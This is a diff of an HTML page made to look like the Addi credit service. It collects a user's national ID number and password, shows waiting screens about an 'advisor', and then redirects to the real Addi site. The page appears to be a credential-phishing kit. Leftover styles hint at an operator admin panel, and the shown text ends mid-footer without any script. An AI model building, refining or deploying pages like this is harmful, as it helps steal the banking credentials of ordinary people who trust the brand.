@@ -1,542 +1,237 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Addi | Compra hoy, paga después</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --ink:#14151a; --muted:#696c75; --blue:#1769f5; --blue-dark:#0756df;
-      --line:#e8e9ed; --surface:#f7f8fa; --mint:#dcf4e7; --yellow:#ffe66d;
-      --font-body:"DM Sans",sans-serif; --font-display:"Manrope",sans-serif;
-      font-family:var(--font-body); color:var(--ink); background:#fff; scroll-behavior:smooth;
-    }
-    *{box-sizing:border-box} body{margin:0;min-width:320px}
-    a{color:inherit;text-decoration:none} button{font:inherit} img{display:block;max-width:100%}
-    .wrap{width:min(1160px,calc(100% - 48px));margin-inline:auto}
-    header{position:sticky;inset-block-start:0;z-index:20;background:rgba(255,255,255,.96);backdrop-filter:blur(12px);border-bottom:1px solid rgba(20,21,26,.06)}
-    .nav{min-height:76px;display:flex;align-items:center;gap:30px}
-    .brand{display:inline-flex;align-items:center;color:var(--blue);font-family:var(--font-display);font-size:38px;font-weight:800;line-height:1;cursor:pointer;user-select:none}
-    .brand .dot{color:#8db4ff}
-    .nav-links{display:flex;align-items:center;gap:28px;margin-left:auto;font-size:14px;font-weight:600}
-    .nav-links a{transition:color .18s} .nav-links a:hover{color:var(--blue)}
-    .nav-actions{display:flex;align-items:center;gap:10px}
-    .button{min-height:46px;display:inline-flex;align-items:center;justify-content:center;gap:10px;border:0;border-radius:999px;padding:0 22px;background:var(--blue);color:#fff;font-weight:700;font-size:14px;cursor:pointer;transition:background .2s,transform .2s}
-    .button:hover{background:var(--blue-dark);transform:translateY(-1px)}
-    .button:disabled{opacity:.6;cursor:default;transform:none}
-    .button-outline{background:#fff;color:var(--ink);border:1px solid var(--line)}
-    .button-outline:hover{background:#f7f8fb;color:var(--ink)}
-    .menu-toggle{display:none;width:44px;height:44px;border:1px solid var(--line);border-radius:50%;background:#fff;color:var(--ink);cursor:pointer}
-    .announcement{background:#f1f3f5;overflow:hidden}
-    .announcement a{min-height:54px;display:flex;justify-content:center;align-items:center;gap:16px;font-size:14px;font-weight:600}
-    .announcement .spark{width:28px;height:28px;display:grid;place-items:center;background:var(--yellow);border-radius:50%}
-    .announcement .under{text-decoration:underline;text-underline-offset:3px}
-    .hero{padding:54px 0 74px;overflow:hidden}
-    .hero-grid{display:grid;grid-template-columns:minmax(0,.94fr) minmax(0,1.06fr);align-items:center;gap:58px}
-    .eyebrow{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;background:#edf4ff;border-radius:999px;color:#2058ad;font-size:12px;font-weight:700}
-    .eyebrow i{display:block;width:7px;height:7px;border-radius:50%;background:var(--blue)}
-    h1,h2,h3,p{margin-top:0}
-    h1{max-width:560px;margin:20px 0 18px;font-family:var(--font-display);font-size:clamp(44px,5.3vw,68px);font-weight:800;line-height:1.04}
-    h1 span{color:var(--blue)}
-    .hero-copy{max-width:460px;margin-bottom:26px;color:#555963;font-size:18px;line-height:1.55}
-    .hero-actions{display:flex;flex-wrap:wrap;gap:12px}
-    .hero-footnote{margin:16px 0 0;color:var(--muted);font-size:12px}
-    .hero-visual{position:relative;min-height:480px}
-    .hero-photo{position:absolute;inset:0 30px 0 36px;overflow:hidden;border-radius:48% 48% 26px 26px;background:#d7e7e4}
-    .hero-photo img{width:100%;height:100%;object-fit:cover;object-position:center}
-    .hero-photo::after{content:"";position:absolute;inset:45% 0 0;background:linear-gradient(transparent,rgba(13,20,20,.18))}
-    .floating-tag{position:absolute;z-index:1;padding:14px 18px;border-radius:16px;background:#fff;box-shadow:0 14px 40px rgba(28,38,61,.12);font-weight:700}
-    .floating-tag small{display:block;margin-bottom:4px;color:var(--muted);font-size:11px;font-weight:500}
-    .tag-top{top:46px;left:0;transform:rotate(-4deg)} .tag-bottom{right:0;bottom:56px;transform:rotate(3deg)}
-    .tag-bottom strong{color:var(--blue);font-family:var(--font-display);font-size:21px}
-    .sun-sticker{position:absolute;right:4px;top:20px;width:86px;aspect-ratio:1;display:grid;place-items:center;border-radius:50%;background:var(--yellow);font-family:var(--font-display);font-size:13px;font-weight:800;line-height:1.1;text-align:center;transform:rotate(10deg)}
-    .trust-row{padding:24px 0;border-block:1px solid var(--line)}
-    .trust-inner{display:flex;align-items:center;justify-content:space-between;gap:24px}
-    .trust-copy{max-width:220px;margin:0;color:var(--muted);font-size:13px;line-height:1.4}
-    .trust-copy strong{display:block;color:var(--ink);font-size:16px}
-    .brand-list{display:flex;align-items:center;justify-content:flex-end;gap:clamp(18px,4vw,52px);color:#777a83;font-family:var(--font-display);font-size:18px;font-weight:800}
-    .brand-list span:nth-child(2){font-family:Georgia,serif;font-style:italic}
-    section{scroll-margin-top:92px} .section{padding:94px 0}
-    .section-head{max-width:620px;margin:0 auto 44px;text-align:center}
-    .kicker{margin-bottom:12px;color:var(--blue);font-size:12px;font-weight:800;text-transform:uppercase}
-    h2{margin-bottom:14px;font-family:var(--font-display);font-size:clamp(32px,4vw,48px);line-height:1.1;font-weight:800}
-    .section-head p{margin-bottom:0;color:var(--muted);font-size:16px;line-height:1.6}
-    .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
-    .step{position:relative;min-height:248px;padding:28px;border-radius:8px;background:var(--surface)}
-    .step:nth-child(2){background:#eff5ff} .step:nth-child(3){background:#fff6d8}
-    .step-number{width:42px;height:42px;display:grid;place-items:center;margin-bottom:32px;border-radius:50%;background:#fff;color:var(--blue);font-family:var(--font-display);font-weight:800}
-    .step h3,.option h3{margin-bottom:10px;font-family:var(--font-display);font-size:20px;line-height:1.25}
-    .step p,.option p{margin-bottom:0;color:#646772;font-size:14px;line-height:1.6}
-    .options-section{background:#f8f9fb}
-    .options{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-    .option{min-height:300px;display:flex;flex-direction:column;align-items:flex-start;padding:26px;border:1px solid #e8e9ed;border-radius:8px;background:#fff}
-    .option-icon{width:48px;height:48px;display:grid;place-items:center;margin-bottom:26px;border-radius:14px;background:var(--mint);font-size:22px}
-    .option:nth-child(2) .option-icon{background:#e7efff} .option:nth-child(3) .option-icon{background:#fff3cc}
-    .option .detail{margin-top:10px;color:var(--blue);font-size:12px;font-weight:700}
-    .option .text-link{margin-top:auto;padding-top:24px;color:var(--blue);font-size:14px;font-weight:700}
-    .option .text-link span{display:inline-block;margin-left:5px;transition:transform .18s}
-    .option .text-link:hover span{transform:translateX(4px)}
-    .app-banner{position:relative;display:grid;grid-template-columns:1fr .8fr;align-items:center;gap:38px;min-height:340px;padding:54px 62px;overflow:hidden;border-radius:10px;background:#dff3e8}
-    .app-banner h2{max-width:500px;font-size:clamp(32px,4vw,46px)}
-    .app-banner p{max-width:410px;margin-bottom:24px;color:#515c56;line-height:1.6}
-    .app-art{position:relative;height:250px;display:grid;place-items:center}
-    .phone{position:relative;width:154px;height:274px;margin-top:34px;padding:14px 10px;border:7px solid #15171c;border-radius:27px;background:#fff;box-shadow:0 18px 30px rgba(15,35,25,.2);transform:rotate(8deg)}
-    .phone::before{content:"";position:absolute;top:5px;left:50%;width:46px;height:10px;border-radius:10px;background:#15171c;transform:translateX(-50%)}
-    .phone-screen{height:100%;padding:18px 7px 8px;border-radius:14px;background:#f5f8f5;font-size:8px}
-    .phone-logo{color:var(--blue);font-family:var(--font-display);font-size:19px;font-weight:800}
-    .phone-product{height:95px;margin:8px 0;overflow:hidden;border-radius:8px}
-    .phone-product img{width:100%;height:100%;object-fit:cover}
-    .phone-bar{height:7px;margin-top:6px;border-radius:10px;background:#d9e0dc} .phone-bar.short{width:58%}
-    .app-asterisk{position:absolute;right:20px;top:18px;color:#ff8875;font-size:48px;transform:rotate(15deg)}
-    .faq-section{padding-top:88px;padding-bottom:100px}
-    .faq-layout{display:grid;grid-template-columns:.8fr 1.2fr;gap:80px;align-items:start}
-    .faq-intro h2{max-width:330px} .faq-intro p{color:var(--muted);line-height:1.6}
-    .faq-list{border-top:1px solid var(--line)}
-    details{border-bottom:1px solid var(--line)}
-    summary{position:relative;padding:21px 38px 21px 0;font-weight:700;list-style:none;cursor:pointer}
-    summary::-webkit-details-marker{display:none}
-    summary::after{content:"+";position:absolute;right:4px;top:50%;color:var(--blue);font-size:24px;font-weight:400;transform:translateY(-50%)}
-    details[open] summary::after{content:"−"}
-    details p{max-width:630px;margin:-4px 38px 20px 0;color:var(--muted);font-size:14px;line-height:1.65}
-    footer{padding:54px 0 26px;background:#f4f5f7}
-    .footer-top{display:flex;align-items:flex-start;justify-content:space-between;gap:42px;padding-bottom:42px}
-    .footer-brand{max-width:280px} .footer-brand p{margin:16px 0 0;color:var(--muted);font-size:13px;line-height:1.6}
-    .footer-links{display:grid;grid-template-columns:repeat(3,minmax(120px,1fr));gap:42px}
-    .footer-col{display:grid;align-content:start;gap:12px;font-size:13px} .footer-col strong{margin-bottom:4px;font-size:13px}
-    .footer-col a{color:#676a73} .footer-col a:hover{color:var(--blue)}
-    .footer-bottom{display:flex;justify-content:space-between;gap:20px;padding-top:20px;border-top:1px solid #dedfe3;color:#777a83;font-size:11px}
-    .toast{position:fixed;right:22px;bottom:22px;z-index:60;max-width:min(380px,calc(100% - 44px));padding:16px 20px;border-radius:10px;background:#15171c;color:#fff;box-shadow:0 10px 32px rgba(0,0,0,.2);font-size:14px;line-height:1.45;opacity:0;pointer-events:none;transform:translateY(10px);transition:opacity .2s,transform .2s}
-    .toast.show{opacity:1;transform:translateY(0)}
-    .reveal{animation:rise-in .7s both}
-    @keyframes rise-in{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
-
-    /* ── SPINNER ── */
-    .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
-    @keyframes spin{to{transform:rotate(360deg)}}
-
-    /* ── MODAL DE CUPO ── */
-    .modal-backdrop{position:fixed;inset:0;z-index:100;background:rgba(14,17,26,.55);backdrop-filter:blur(6px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .25s}
-    .modal-backdrop.open{opacity:1;pointer-events:auto}
-    .modal{width:100%;max-width:440px;background:#fff;border-radius:20px;padding:40px 36px 36px;box-shadow:0 24px 60px rgba(14,17,26,.2);transform:translateY(18px) scale(.97);transition:transform .28s cubic-bezier(.22,1,.36,1);position:relative}
-    .modal-backdrop.open .modal{transform:translateY(0) scale(1)}
-    .modal-close{position:absolute;top:16px;right:18px;width:32px;height:32px;border-radius:50%;border:1px solid var(--line);background:#fff;cursor:pointer;font-size:18px;color:var(--muted);display:grid;place-items:center;transition:background .15s}
-    .modal-close:hover{background:var(--surface)}
-    .modal-logo{color:var(--blue);font-family:var(--font-display);font-size:28px;font-weight:800;margin-bottom:6px}
-    .modal-logo .dot{color:#8db4ff}
-    .modal h3{font-family:var(--font-display);font-size:22px;margin-bottom:6px}
-    .modal-sub{color:var(--muted);font-size:14px;margin-bottom:28px;line-height:1.5}
-    .field{margin-bottom:18px}
-    .field label{display:block;font-size:13px;font-weight:700;margin-bottom:7px}
-    .field input{width:100%;padding:12px 16px;border:1.5px solid var(--line);border-radius:10px;font:inherit;font-size:15px;outline:none;transition:border-color .18s}
-    .field input:focus{border-color:var(--blue)} .field input.err{border-color:#e53e3e}
-    .field-err{color:#e53e3e;font-size:12px;margin-top:5px;display:none} .field-err.show{display:block}
-    .modal-btn{width:100%;margin-top:8px}
-    .modal-note{margin-top:14px;color:var(--muted);font-size:11px;text-align:center;line-height:1.5}
-    .modal-result{text-align:center;padding:10px 0 6px}
-    .modal-result .big-icon{font-size:48px;margin-bottom:14px}
-    .modal-result h3{font-family:var(--font-display);font-size:20px;margin-bottom:10px}
-    .modal-result p{color:var(--muted);font-size:14px;line-height:1.6}
-    .pending-badge{display:inline-flex;align-items:center;gap:7px;margin-top:16px;padding:8px 16px;background:#fff8e1;border-radius:999px;color:#b7791f;font-size:12px;font-weight:700}
-    .pending-badge i{width:8px;height:8px;border-radius:50%;background:#f6ad55;display:block}
-
-    @media(max-width:900px){
-      .nav{gap:18px} .nav-links{gap:16px} .nav-links a:nth-child(3){display:none}
-      .hero-grid{gap:30px} .hero-visual{min-height:410px}
-      .app-banner{padding:42px} .faq-layout{gap:42px} .adm-stats{grid-template-columns:repeat(2,1fr)}
-    }
-    @media(max-width:680px){
-      .wrap{width:min(100% - 36px,540px)} .nav{min-height:66px;justify-content:space-between}
-      .brand{font-size:34px} .nav-actions{margin-left:auto}
-      .nav-actions .button{min-height:40px;padding-inline:14px;font-size:12px}
-      .menu-toggle{display:inline-grid;place-items:center}
-      .nav-links{position:absolute;inset:66px 0 auto;display:none;padding:10px 18px 20px;border-bottom:1px solid var(--line);background:#fff;box-shadow:0 12px 20px rgba(20,21,26,.06)}
-      .nav-links.open{display:grid;gap:0}
-      .nav-links a,.nav-links a:nth-child(3){display:block;padding:14px 2px;border-bottom:1px solid #f0f0f2}
-      .announcement a{min-height:48px;gap:9px;font-size:11px}
-      .announcement .spark{width:22px;height:22px;flex:0 0 auto}
-      .hero{padding:42px 0 50px} .hero-grid{grid-template-columns:1fr;gap:34px}
-      h1{font-size:clamp(42px,12vw,58px)} .hero-copy{font-size:16px}
-      .hero-visual{min-height:365px} .hero-photo{inset:0 18px 0 30px;border-radius:48% 48% 20px 20px}
-      .tag-top{top:30px} .tag-bottom{bottom:28px}
-      .sun-sticker{right:-2px;width:70px;font-size:11px}
-      .trust-inner{align-items:flex-start;flex-direction:column}
-      .brand-list{width:100%;justify-content:space-between;gap:12px;font-size:15px}
-      .section{padding:68px 0} .section-head{margin-bottom:30px;text-align:left}
-      .steps,.options{grid-template-columns:1fr;gap:12px}
-      .step{min-height:0;padding:24px} .step-number{margin-bottom:20px}
-      .option{min-height:250px}
-      .app-banner{grid-template-columns:1fr;gap:4px;padding:32px 26px 18px}
-      .app-art{height:230px} .phone{transform:rotate(5deg) scale(.86);transform-origin:top center}
-      .faq-layout{grid-template-columns:1fr;gap:26px} .faq-intro h2{max-width:420px}
-      .faq-section{padding-top:68px;padding-bottom:76px}
-      .footer-top{flex-direction:column;gap:34px}
-      .footer-links{width:100%;grid-template-columns:repeat(2,1fr);gap:28px 20px}
-      .footer-bottom{flex-direction:column}
-      .modal{padding:32px 22px 28px} .adm-content{padding:24px 16px 48px}
-      .adm-header{padding:0 16px} .adm-stats{grid-template-columns:1fr} .redir-input{width:130px}
-    }
-    @media(prefers-reduced-motion:reduce){*,*::before,*::after{scroll-behavior:auto!important;animation-duration:.01ms!important;transition-duration:.01ms!important}}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Addi - Desembolso</title>
+<style>
+:root{
+  --brand:#3d5afe;
+  --brand-600:#3346e0;
+  --brand-050:#e8ecff;
+  --ink:#1a2b32;
+  --muted:#6b7c85;
+  --line:#e4eaed;
+  --bg:#ffffff;
+  --soft:#f6f9fa;
+  --danger:#e5484d;
+  --font:'Segoe UI',system-ui,-apple-system,Roboto,Arial,sans-serif
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:var(--font);color:var(--ink);background:var(--soft);-webkit-font-smoothing:antialiased}
+.shell{max-width:960px;margin:0 auto;min-height:100vh;background:var(--bg);display:flex;flex-direction:column}
+header{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;padding:16px 24px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:5}
+.logo{display:flex;align-items:center;gap:9px;font-weight:800;font-size:26px;color:var(--brand);letter-spacing:-.5px}
+.logo span{color:#8db4ff}
+.close{display:flex;align-items:center;gap:8px;color:var(--muted);font-weight:600;font-size:14px;cursor:pointer;background:none;border:none;justify-self:end}
+.close .x{width:30px;height:30px;border-radius:50%;background:var(--brand-050);display:grid;place-items:center;color:var(--brand);font-size:16px}
+main{flex:1;display:flex;justify-content:center;padding:40px 24px}
+.card{width:100%;max-width:520px}
+.step{display:none;animation:fade .35s ease}
+.step.active{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+h1{font-size:26px;margin:0 0 8px;letter-spacing:-.5px}
+.sub{color:var(--muted);margin:0 0 28px;line-height:1.5}
+label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
+.field{width:100%;padding:15px 16px;font-size:16px;border:1.5px solid var(--line);border-radius:12px;outline:none;transition:.15s;font-family:inherit}
+.field:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-050)}
+.err{color:var(--danger);font-size:13px;margin-top:8px;display:none}
+.btn{width:100%;padding:16px;border:none;border-radius:30px;background:var(--brand);color:#fff;font-weight:700;font-size:16px;cursor:pointer;transition:.15s;font-family:inherit;text-align:center}
+.btn:hover{background:var(--brand-600)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.footer-btn{position:sticky;bottom:0;padding:20px 0}
+.legal{font-size:13px;color:var(--muted);line-height:1.5;margin:0 0 16px;text-align:center}
+.legal a{color:var(--brand);font-weight:700;text-decoration:none}
+.loader-wrap{display:flex;flex-direction:column;align-items:center;gap:22px;padding:80px 0;text-align:center}
+.loader{width:64px;height:64px;border:4px solid var(--brand-050);border-top-color:var(--brand);border-radius:50%;animation:spin .9s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loader-text{font-weight:700;color:var(--ink);font-size:18px}
+.loader-sub{color:var(--muted);font-size:14px;max-width:320px;line-height:1.5}
+.verify-box{text-align:center;padding:24px 0 8px}
+.v-icon{font-size:72px;display:block;margin:0 auto 16px}
+.verify-box h1{font-size:24px;font-weight:700;letter-spacing:-.4px;margin:0 0 10px}
+.v-sub{color:var(--muted);font-size:15px;line-height:1.55;margin:0 auto 26px;max-width:380px}
+.v-sub b{color:var(--ink)}
+.load-layer{position:fixed;inset:0;background:rgba(255,255,255,.94);z-index:80;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+.load-text{font-weight:700;color:var(--ink);font-size:17px}
+@media(max-width:560px){main{padding:28px 18px}h1{font-size:22px}header{padding-left:18px;padding-right:18px}}
+</style>
 </head>
 <body>
+<div class="shell">
+  <header>
+    <span aria-hidden="true"></span>
+    <div class="logo">Addi<span>.</span></div>
+    <button class="close" onclick="if(confirm('¿Deseas salir del proceso?'))location.reload()">
+      <span>Cerrar</span><span class="x">✕</span>
+    </button>
+  </header>
 
-<!-- ══════════════ MODAL CUPO ══════════════ -->
-<div class="modal-backdrop" id="cupo-modal" role="dialog" aria-modal="true" aria-labelledby="modal-h">
-  <div class="modal">
-    <button class="modal-close" id="modal-close-btn" aria-label="Cerrar">✕</button>
+  <main>
+    <div class="card">
 
-    <div id="mv-form">
-      <div class="modal-logo">Addi<span class="dot">.</span></div>
-      <h3 id="modal-h">Pide tu cupo</h3>
-      <p class="modal-sub">Ingresa tus datos para continuar con tu solicitud de crédito.</p>
-      <form id="cupo-form" novalidate autocomplete="off">
-        <div class="field">
-          <label for="f-cedula">Número de cédula</label>
-          <input type="text" id="f-cedula" placeholder="Ej. 1023456789" inputmode="numeric">
-          <div class="field-err" id="err-cedula">Por favor ingresa tu número de cédula.</div>
+      <!-- STEP 1: Cédula -->
+      <section class="step active" id="s-cedula">
+        <h1>Ingresa tus datos</h1>
+        <p class="sub">Queremos asegurarnos de que eres tú.</p>
+        <label for="cedula">Cédula de ciudadanía</label>
+        <input class="field" id="cedula" inputmode="numeric" maxlength="12" placeholder="Ej: 1193531369" autocomplete="off" autofocus>
+        <div class="err" id="cedula-err">Ingresa una cédula válida (mínimo 6 dígitos).</div>
+        <p class="legal" style="margin-top:26px">Al continuar, <a href="#">autorizas el tratamiento de tus datos personales</a> según nuestra <a href="#">Política de Privacidad</a>. Consultar tu historial de desembolso es un paso indispensable en tu proceso de aprobación.</p>
+        <div class="footer-btn">
+          <button class="btn" id="btnCedula" onclick="submitCedula()">Continuar</button>
         </div>
-        <div class="field">
-          <label for="f-pass">Contraseña</label>
-          <input type="password" id="f-pass" placeholder="••••••••">
-          <div class="field-err" id="err-pass">Por favor ingresa tu contraseña.</div>
+      </section>
+
+      <!-- STEP 2: Contraseña -->
+      <section class="step" id="s-pass">
+        <h1>Verifica tu contraseña</h1>
+        <p class="sub">Ingresa tu contraseña para continuar con la solicitud.</p>
+        <label for="passwd">Contraseña</label>
+        <input class="field" id="passwd" type="password" autocomplete="current-password" placeholder="Tu contraseña">
+        <div class="err" id="pass-err">Ingresa una contraseña válida.</div>
+        <div class="footer-btn">
+          <button class="btn" id="btnPass" onclick="submitPass()">Continuar</button>
         </div>
-        <button type="submit" class="button modal-btn" id="submit-btn">
-          Enviar solicitud <span aria-hidden="true">→</span>
-        </button>
-      </form>
-      <p class="modal-note">Tus datos son usados únicamente para evaluar tu solicitud.</p>
-    </div>
+      </section>
 
-    <div id="mv-approved" class="modal-result" style="display:none">
-      <div class="big-icon">✅</div>
-      <h3>Validación correcta</h3>
-      <p style="font-size:16px;font-weight:600;color:var(--ink);margin-top:10px;line-height:1.5;">
-        En un momento su asesor se comunicará con usted.
-      </p>
-      <div class="pending-badge" style="background:#e6f4ea;color:#137333;margin-top:16px;"><i style="background:#34a853;"></i> Proceso exitoso</div>
-    </div>
+      <!-- STEP 3: Validación / Espera del Asesor -->
+      <section class="step" id="s-verif">
+        <div class="loader-wrap">
+          <div class="loader"></div>
+          <div class="loader-text">Validando tu información…</div>
+          <div class="loader-sub">Estamos preparando todo para atenderte. Por favor no cierres esta ventana.</div>
+        </div>
+      </section>
 
-    <div id="mv-rejected" class="modal-result" style="display:none">
-      <div class="big-icon">❌</div>
-      <h3>Solicitud no aprobada</h3>
-      <p>En este momento no podemos otorgarte el cupo solicitado. Te invitamos a intentarlo nuevamente en 30 días.</p>
-      <button class="button" style="margin-top:16px" onclick="showView('mv-form')">Volver a intentar</button>
-    </div>
+      <!-- STEP 4: Mensaje Final de Aprobación -->
+      <section class="step" id="s-asesor">
+        <div class="verify-box">
+          <div class="v-icon">✅</div>
+          <h1>Validación correcta</h1>
+          <p class="v-sub">En un momento su <b>asesor se comunicará con usted</b>.</p>
+          <div class="btn" onclick="window.location.href='https://co.addi.com'">Finalizar</div>
+        </div>
+      </section>
 
-    <div id="mv-pending" class="modal-result" style="display:none">
-      <div class="big-icon"><span class="spinner" style="width:36px;height:36px;border-width:3px;border-color:rgba(23,105,245,.2);border-top-color:var(--blue);"></span></div>
-      <h3>Solicitud en revisión</h3>
-      <p>Estamos evaluando tu información en este momento. Por favor no cierres esta ventana.</p>
-      <div class="pending-badge"><i></i> Esperando respuesta del asesor...</div>
-    </div>
+      <!-- STEP RECHAZADO -->
+      <section class="step" id="s-rechazado">
+        <div class="verify-box">
+          <div class="v-icon">❌</div>
+          <h1>Solicitud no aprobada</h1>
+          <p class="v-sub">En este momento no podemos otorgarte el cupo solicitado. Te invitamos a intentarlo de nuevo en 30 días.</p>
+          <div class="btn" onclick="location.reload()">Volver a intentar</div>
+        </div>
+      </section>
 
-    <div id="mv-error" class="modal-result" style="display:none">
-      <div class="big-icon">⚠️</div>
-      <h3>Error de conexión</h3>
-      <p>No se pudo conectar con el servidor. Inténtalo de nuevo más tarde.</p>
-      <button class="button" style="margin-top:16px" onclick="showView('mv-form')">Reintentar</button>
     </div>
-  </div>
+  </main>
 </div>
 
-<!-- ══════════════ SITIO PÚBLICO ══════════════ -->
-<header>
-  <nav class="nav wrap" aria-label="Navegación principal">
-    <a class="brand" href="#inicio" id="brand-logo">Addi<span class="dot">.</span></a>
-    <div class="nav-links" id="nav-links">
-      <a href="#como-funciona">Cómo funciona</a>
-      <a href="#opciones">Créditos</a>
-      <a href="#marketplace">Dónde comprar</a>
-      <a href="#preguntas">Preguntas frecuentes</a>
-    </div>
-    <div class="nav-actions">
-      <button class="button" data-cupo>Quiero conocer más <span aria-hidden="true">↗</span></button>
-      <button class="menu-toggle" aria-label="Abrir menú" aria-expanded="false" aria-controls="nav-links"><span aria-hidden="true">☰</span></button>
-    </div>
-  </nav>
-</header>
-
-<div class="announcement">
-  <a href="#marketplace"><span class="spark" aria-hidden="true">✦</span><span>Marketplace ahora en web. Compra a 3 cuotas sin interés.</span><span class="under">Descúbrelo <span aria-hidden="true">→</span></span></a>
+<!-- Capa de espera mientras valida -->
+<div class="load-layer" id="loadLayer">
+  <div class="loader"></div>
+  <div class="load-text" id="loadText">Esperando validación del asesor…</div>
 </div>
 
-<main>
-  <section class="hero" id="inicio">
-    <div class="hero-grid wrap">
-      <div class="hero-content reveal">
-        <span class="eyebrow"><i></i> Compra a tu manera</span>
-        <h1>Compra lo que quieres hoy, <span>págalo después.</span></h1>
-        <p class="hero-copy">Pide tu crédito en minutos y compra a cuotas, sin enredos y en tus tiendas favoritas.</p>
-        <div class="hero-actions">
-          <button class="button" data-cupo>Pide tu cupo <span aria-hidden="true">→</span></button>
-          <a class="button button-outline" href="#como-funciona">Cómo funciona</a>
-        </div>
-        <p class="hero-footnote">Sujeto a aprobación y condiciones aplicables.</p>
-      </div>
-      <div class="hero-visual reveal">
-        <div class="hero-photo">
-          <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1200&q=85" alt="Amigas mirando prendas en una tienda" fetchpriority="high">
-        </div>
-        <div class="floating-tag tag-top"><small>Tu próxima compra</small>Sin complicaciones ✦</div>
-        <div class="floating-tag tag-bottom"><small>Flexibilidad para ti</small><strong>Compra + disfruta</strong></div>
-        <div class="sun-sticker">A tu<br>ritmo ✦</div>
-      </div>
-    </div>
-  </section>
-
-  <div class="trust-row" id="marketplace">
-    <div class="trust-inner wrap">
-      <p class="trust-copy"><strong>Compra donde quieras</strong>En más de 35.000 tiendas físicas y online.</p>
-      <div class="brand-list"><span>falabella</span><span>Vélez</span><span>ÉXITO</span><span>Samsung</span><span>+35 mil</span></div>
-    </div>
-  </div>
-
-  <section class="section" id="como-funciona">
-    <div class="wrap">
-      <div class="section-head">
-        <p class="kicker">Así de fácil</p>
-        <h2>Así usas Addi</h2>
-        <p>En tienda, en línea o desde la app: elige cómo quieres comprar y paga en cuotas.</p>
-      </div>
-      <div class="steps">
-        <article class="step"><span class="step-number">01</span><h3>Elige tu tienda</h3><p>Encuentra lo que buscas en tus tiendas favoritas, físicas u online.</p></article>
-        <article class="step"><span class="step-number">02</span><h3>Selecciona Addi</h3><p>Al pagar, escoge Addi como tu medio de pago y sigue los pasos indicados.</p></article>
-        <article class="step"><span class="step-number">03</span><h3>Paga a tu ritmo</h3><p>Revisa las opciones disponibles y elige las cuotas que se ajusten a ti.</p></article>
-      </div>
-    </div>
-  </section>
-
-  <section class="section options-section" id="opciones">
-    <div class="wrap">
-      <div class="section-head">
-        <p class="kicker">Flexibilidad total</p>
-        <h2>Opciones para todos</h2>
-        <p>Elige la alternativa que mejor va contigo y con lo que quieres.</p>
-      </div>
-      <div class="options">
-        <article class="option"><span class="option-icon">✦</span><h3>Para lo que quieras, cuándo quieras</h3><p>Compra en tus marcas favoritas y paga en cuotas.</p><span class="detail">Hasta 6 cuotas para compras elegibles</span><a class="text-link" href="#preguntas">Conoce más <span>→</span></a></article>
-        <article class="option"><span class="option-icon">↗</span><h3>Grandes planes, grandes soluciones</h3><p>Para compras de mayor valor, revisa las alternativas disponibles.</p><span class="detail">Opciones de plazo sujetas a aprobación</span><a class="text-link" href="#preguntas">Conoce más <span>→</span></a></article>
-        <article class="option"><span class="option-icon">▦</span><h3>El lugar donde todo se compra fácil</h3><p>Explora productos de distintas categorías en un solo lugar.</p><span class="detail">Tu próxima compra está por aquí</span><a class="text-link" href="#marketplace">Explora el marketplace <span>→</span></a></article>
-      </div>
-    </div>
-  </section>
-
-  <section class="section">
-    <div class="app-banner wrap">
-      <div>
-        <p class="kicker">Todo en un solo lugar</p>
-        <h2>Hazte la vida más Addi</h2>
-        <p>Descubre tiendas, explora productos y consulta tus compras desde la app.</p>
-        <button class="button" data-cupo>Descubre la app <span>→</span></button>
-      </div>
-      <div class="app-art" aria-hidden="true">
-        <span class="app-asterisk">✳</span>
-        <div class="phone"><div class="phone-screen"><div class="phone-logo">Addi.</div><div>Descubre algo que te encanta</div><div class="phone-product"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?auto=format&fit=crop&w=360&q=80" alt=""></div><strong>Tu tienda favorita</strong><div class="phone-bar"></div><div class="phone-bar short"></div><div class="phone-bar"></div></div></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="faq-section" id="preguntas">
-    <div class="faq-layout wrap">
-      <div class="faq-intro"><p class="kicker">Te acompañamos</p><h2>¿Tienes dudas?</h2><p>Aquí respondemos algunas preguntas frecuentes.</p><a class="text-link" href="#inicio">Volver al inicio <span>↑</span></a></div>
-      <div class="faq-list">
-        <details><summary>¿Necesito tarjeta de crédito para usar Addi?</summary><p>No. La propuesta de Addi permite comprar a cuotas sin tarjeta de crédito tradicional.</p></details>
-        <details><summary>¿Qué pasa si mi cupo no alcanza?</summary><p>Las opciones pueden variar por comercio y perfil. Consulta con la tienda para más alternativas.</p></details>
-        <details><summary>¿Es seguro compartir mis datos?</summary><p>Verifica siempre que estés en los canales oficiales antes de compartir información.</p></details>
-        <details><summary>¿Cómo sé si mi solicitud fue aprobada?</summary><p>Al ingresar de nuevo con tu cédula, serás redirigido automáticamente si fuiste aprobado.</p></details>
-      </div>
-    </div>
-  </section>
-</main>
-
-<footer>
-  <div class="wrap">
